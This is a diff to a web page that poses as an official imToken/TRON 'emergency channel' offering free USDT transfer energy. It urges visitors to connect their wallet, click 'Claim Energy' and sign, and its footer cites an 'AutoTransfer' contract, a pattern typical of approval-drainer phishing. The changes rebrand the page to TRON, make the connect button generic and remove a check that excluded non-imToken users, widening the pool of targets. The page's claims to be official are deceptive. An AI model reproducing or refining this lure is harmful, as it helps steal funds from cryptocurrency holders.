@@ -4,14 +4,14 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>imToken官方应急通道</title>
-    <meta property="og:title" content="imToken官方应急通道" />
-    <meta property="og:description" content="imToken专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
+    <meta property="og:title" content="TRON官方应急通道" />
+    <meta property="og:description" content="TRON专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
     <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta property="og:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="imToken官方应急通道" />
-    <meta name="twitter:description" content="imToken专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
+    <meta name="twitter:title" content="TRON官方应急通道" />
+    <meta name="twitter:description" content="TRON专属能量领取通道，每个钱包地址每30天可免费领取90000μs USDT转账能量" />
     <meta name="twitter:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
     <meta name="twitter:url" content="https://trc20trx-alt.github.io/Trc20.TRX/" />
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
@@ -628,7 +628,7 @@ body {
     <div class="container">      
         <div class="header-container">
             <div class="header">
-                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="imToken Logo" class="header-logo">
+                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="tron Logo" class="header-logo">
            </div>            
             <div class="lang-switch">
                 <div class="lang-dropdown" id="langDropdown">
@@ -650,11 +650,7 @@ body {
                 <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
          </div>
     </div>
-        <!-- 原有非imToken弹窗 -->
-        <div id="nonImTokenPopup">
-            <p>不支持非imToken用户</p>
-            <button id="closePopupBtn">关闭</button>
-        </div>
+      
         
        <!-- 新增：多钱包选择弹窗 -->
 <div id="multiWalletPopup">
@@ -662,7 +658,7 @@ body {
     <div class="wallet-list">
         <!-- imToken：对应 icon/imtoken.png -->
         <div class="wallet-item" data-wallet="imtoken">
-            <img src="./icon/imToken.png" alt="imToken Logo" class="wallet-logo">
+            <img src="./icon/imToken.png" alt=" imToken Logo" class="wallet-logo">
             <span class="wallet-name">imToken</span>
         </div>
         <!-- TokenPocket：对应 icon/tokenpocket.png -->
@@ -756,7 +752,7 @@ body {
                 <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
                 <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
             </div> 
-            <button id="connectBtn" class="btn">连接imToken钱包</button>
+            <button id="connectBtn" class="btn">连接钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
             <div id="reviewTip" class="review-tip" style="display: none;">
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
@@ -860,7 +856,7 @@ const langConfig = {
     zh: {
         headerTitle: "imToken",
         headerDesc: "imToken官方应急通道",
-        userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
+        userInfoDefault: "未连接钱包<br><span>请点击底部「连接钱包」按钮</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
         disconnectedTip1: "此链接为imToken专属通道，非imToken用户不可领取",
@@ -884,7 +880,7 @@ const langConfig = {
         noRecord: "暂无能量领取记录",
         browserWarn1: " ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开",
         browserWarn2: " ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken",
-        connectBtnText: "连接imToken钱包",
+        connectBtnText: "连接钱包",
         approveBtnText: "领取能量",
         reviewTipText: "系统审核中，审核通过后请务必完成签名",
         footerInfo: "合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）© 2025 能量服务 | <a href='https://tronscan.org' target='_blank'>TRON浏览器</a> | <a href='https://token.im' target='_blank'>imToken官网</a>",
@@ -930,7 +926,7 @@ const langConfig = {
     en: {
         headerTitle: "imToken",
         headerDesc: "imToken Official Emergency Channel",
-        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
+        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect Wallet' button below</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
         disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
@@ -954,7 +950,7 @@ const langConfig = {
         noRecord: "No energy claim records",
         browserWarn1: " ⚠️ Open with <strong>imToken in-app browser</strong>",
         browserWarn2: " ⚠️ Non-wallet browser: Click button to copy + launch imToken",
-        connectBtnText: "Connect imToken Wallet",
+        connectBtnText: "Connect Wallet",
         approveBtnText: "Claim Energy",
         reviewTipText: "System reviewing - please complete the signature after approval",
         footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) © 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://token.im' target='_blank'>imToken Official</a>",
